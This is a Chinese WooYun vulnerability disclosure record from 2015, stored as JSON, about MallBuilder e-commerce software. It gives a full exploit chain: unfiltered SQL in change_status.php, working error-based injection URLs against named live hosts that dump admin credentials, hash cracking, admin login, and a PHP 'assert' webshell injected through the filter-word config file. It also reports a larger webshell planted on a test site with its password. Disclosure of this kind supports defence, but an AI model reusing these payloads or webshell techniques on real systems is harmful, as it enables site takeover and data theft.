{"id": 81941, "wybug_id": "wooyun-2015-0152481", "wybug_title": "上海远丰信息科技有限公司旗下产品MallBuilder某处设计缺陷可注入", "wybug_corp": "shop-builder.cn", "wybug_author": "路人甲", "wybug_date": "2015-11-08 21:18", "wybug_open_date": "2015-11-21 18:10", "wybug_type": "SQL注射漏洞", "wybug_level": "中", "wybug_rank_0": "10", "wybug_status": "漏洞已经通知厂商但是厂商忽略漏洞", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["默认密码", "任意命令执行"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-11-08：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-11-21：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： 该注入可以获取后台用户名，有了后台用户名，我们就可以登录挂上一句话，然后就是整站拿下，如果安全不到位，可能会把服务器也拿下，该公司客户网站多个都有此问题。涉及范围比较大。 详细说明：  在7.0+版本中，文件位于目录\n/pay/api/change_status.php\n我们先看看文件内容\n<?php/*** Dsc : 改变订单流水状态*/if(!isset($_GET['id'])){die();}include_once(\"../includes/global.php\");include_once(\"../config/table_config.php\");$id = $_GET['id'];$sql = \"update \".CASHFLOW.\" set `statu` = '2' where `order_id` = '$id' \";$db -> query($sql);?>\n我们可以看到第六行代码并没有进行过滤，只是做了一个简单的判断同样在该目录下的\n/pay/api/member.php\n也有此问题有了上面的条件之后我们就可以构建语句了   漏洞证明：  查询数据库是否支持，能够返回帮本就说明基本没问题\nhttp://test.yuanfeng021.com/mall_lhh/pay/api/change_status.php?id=1'or (SELECT * FROM (SELECT(name_const(version(),1)),name_const(version(),1))a) or'\n\nhttp://www.mallbuilder.cn/pay/api/change_status.php?id=1%27or%20(SELECT%20*%20FROM%20(SELECT(name_const(version(),1)),name_const(version(),1))a)%20or%27\n\n\n看截图看起来没问题我们就可以百度上去搜索下，有很多，就不一一示范了\n\n接下来是重点我们测试可以注入后，我们查询后台管理员信息，注意，如果表前缀改过了，可能需要耗费大量时间来爆表\nhttp://test.yuanfeng021.com/mall_lhh/pay/api/change_status.php?id=1' or updatexml(1,concat(0x7e,(SELECT concat_ws(\":\",user,name,password) FROM mallbuilder_admin limit 0,1)),0) or'\n\nhttp://www.mallbuilder.cn/pay/api/change_status.php?id=1' or updatexml(1,concat(0x7e,(SELECT concat_ws(\":\",user,name,password) FROM mallbuilder_admin limit 0,1)),0) or'\n看已经能够查询出用户名以及密码（这里的密码会出现截断现象，自行解决，啧啧）了，但是密码是md5，可以去cmd5解密，看看能不能解\n\n解密成功后，我们就可以打开后台啦\nhttp://test.yuanfeng021.com/mall_lhh/admin\n登陆成功\n\n然后切换到工具，点击增加过滤词。我们随便添加一个，比如1\n\n我们再看过滤词管理。有我们刚添加的1，多添加几个，这就不上图了我们再看下过滤关键词的文件是放在哪的。在\nconfig/filter.inc.php\n打开看看\n<?php    $find= array('/1/i','/2/i');    $replace=array('*','*');    $banned='';    $_CACHE['word_filter'] = Array    (        'filter' => Array        (            'find' => &$find,            'replace' => &$replace        ),        'banned' => &$banned    );    ?>\n现在我们看第二行与第三行，我们需要构建为自己需要的格式，我们尝试看单引号双引号又没过滤，具体就不讲解了，直接上修改代码，现在我们就点击刚才我们添加的过滤词，点击修改\n\n把词组与替换分别改成如图所示（ps：安全狗什么的都可以去死了），然后提交数据，会告诉你修改成功，爽歪歪我们看下修改后的php变成什么样了\n<?php\t$find= array('/ ');$k=\"ass\".\"ert\";/*/i');\t$replace=array('*/@$k(${\"_POST\"}[1]);die;//');\t$banned='';\t$_CACHE['word_filter'] = Array\t(\t\t'filter' => Array\t\t(\t\t\t'find' => &$find,\t\t\t'replace' => &$replace\t\t),\t\t'banned' => &$banned\t);\t?>\n接下来我们测试下\nhttp://test.yuanfeng021.com/mall_lhh/config/filter.inc.php POST 1=phpinfo()\n\n\n可以执行phpinfo()；好了，然后就没了，都能执行了，那就上传一个大马吧，我已给你们备好一个了\nhttp://test.yuanfeng021.com/mall_lhh/config/asp.php 密码是admin\n   修复方案：  你们应该比我还清楚，我只是一个小辈   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2015-11-21 18:10 厂商回复：  漏洞Rank：2  (WooYun评价) 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n     2016-01-11 20:14 |    \t\t邪少 \t\t\t( 实习白帽子  |\t\t\t        Rank:75 漏洞数:12        | 百里长苏)\t\t \n  哥们 断码  怎么解决    \n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}